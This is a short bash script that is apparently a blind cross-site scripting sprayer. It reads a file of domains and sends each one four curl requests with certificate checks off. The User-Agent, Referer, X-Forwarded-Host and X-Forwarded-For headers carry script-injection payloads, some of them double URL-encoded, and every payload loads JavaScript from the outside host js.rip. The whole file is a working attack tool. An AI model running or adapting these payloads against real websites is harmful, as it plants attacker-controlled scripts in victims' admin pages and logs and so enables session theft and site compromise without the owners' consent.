#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <domain_file>"
    exit 1
fi

domain_file="$1"

user_agent="'><script src=//js.rip/rt17z79c41></script>"
referer="'><script src=//js.rip/rt17z79c41></script>"
x_forwarded_host="'><script src=//js.rip/rt17z79c41></script"
x_forwarded_for="'><script src=//js.rip/rt17z79c41></script>"
user_agent_1="';\"><script/src=//js.rip/rt17z79c41/"
referer_1="';\"><script/src=//js.rip/rt17z79c41/"
x_forwarded_host_1="';\"><script/src=//js.rip/rt17z79c41/"
x_forwarded_for_1="';\"><script/src=//js.rip/rt17z79c41/"
user_agent_2="</script><Iframe SrcDoc="><script src=https://js.rip/rt17z79c41></script>">"
referer_2="</script><Iframe SrcDoc="><script src=https://js.rip/rt17z79c41></script>">"
x_forwarded_host_2="</script><Iframe SrcDoc="><script src=https://js.rip/rt17z79c41></script>">"
x_forwarded_for_2="</script><Iframe SrcDoc="><script src=https://js.rip/rt17z79c41></script>">"
user_agent_3="%253C%252Fscript%253E%253CIframe%2520SrcDoc%253D%2522%253E%253Cscript%2520src%253Dhttps%253A%252F%252Fjs.rip%252Frt17z79c41%253E%253C%252Fscript%253E%2522%253E"
referer_3="%253C%252Fscript%253E%253CIframe%2520SrcDoc%253D%2522%253E%253Cscript%2520src%253Dhttps%253A%252F%252Fjs.rip%252Frt17z79c41%253E%253C%252Fscript%253E%2522%253E"
x_forwarded_host_3="%253C%252Fscript%253E%253CIframe%2520SrcDoc%253D%2522%253E%253Cscript%2520src%253Dhttps%253A%252F%252Fjs.rip%252Frt17z79c41%253E%253C%252Fscript%253E%2522%253E"
x_forwarded_for_3="%253C%252Fscript%253E%253CIframe%2520SrcDoc%253D%2522%253E%253Cscript%2520src%253Dhttps%253A%252F%252Fjs.rip%252Frt17z79c41%253E%253C%252Fscript%253E%2522%253E"

# Loop through each domain in the file and send the HTTP request with custom headers
while IFS= read -r domain; do
    url="${domain}"

    echo "Sending request to: $url"

    # Using curl to send the request with predefined headers and payload
    curl --insecure -X GET "$url" \
         -H "User-Agent: $user_agent" \
         -H "Referer: $referer" \
         -H "X-Forwarded-Host: $x_forwarded_host" \
         -H "X-Forwarded-For: $x_forwarded_for"

    curl --insecure -X GET "$url" \
         -H "User-Agent: $user_agent_1" \
         -H "Referer: $referer_1" \
         -H "X-Forwarded-Host: $x_forwarded_host_1" \
         -H "X-Forwarded-For: $x_forwarded_for_1"

    curl --insecure -X GET "$url" \
         -H "User-Agent: $user_agent_2" \
         -H "Referer: $referer_2" \
         -H "X-Forwarded-Host: $x_forwarded_host_2" \
         -H "X-Forwarded-For: $x_forwarded_for_2"

    curl --insecure -X GET "$url" \
         -H "User-Agent: $user_agent_3" \
         -H "Referer: $referer_3" \
         -H "X-Forwarded-Host: $x_forwarded_host_3" \
         -H "X-Forwarded-For: $x_forwarded_for_3"


 
done < "$domain_file"
